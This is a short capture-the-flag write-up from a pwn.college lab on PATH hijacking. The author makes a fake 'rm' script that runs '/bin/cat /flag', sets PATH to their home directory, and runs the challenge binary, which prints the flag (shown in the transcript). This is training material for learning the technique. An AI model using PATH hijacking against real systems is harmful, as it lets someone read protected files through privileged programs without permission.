# Hijacking commands
## INTRODUCTION 
In the 4th challenge, we had to create a command `rm` that will give the flag instead of deleting it when we run `/challenge/run`.We can do this by making a duplicate shell script in the home directory named `rm` which will not delete the flag but will `cat` it.So i wrote `nano rm` to create a shell script in the home directory named `rm` then i wrote `/bin/cat /flag `in the `rm` file and saved it.
Then i updated the `PATH` variable to `/home/hacker` so that when the `/challenge/run` is envoked, it doesnt go to the original `rm` command and delete the flag but go to the `rm` shell script that i created which will `cat` the flag.Then i envoked the `/challenge/run` to get the flag.
## CODE
``` bash
Connected!
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod u+rwx rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{kTwG3Wxj7heNvssZpRpDnuZ_Pr6.ddzNyUDL4YDN0czW}
```
## RESOURCES
none
## REMARK
i didnt include the lines where i added the commands `/bin/cat /flag` in the `rm` shell script because they were in the nano text editor.
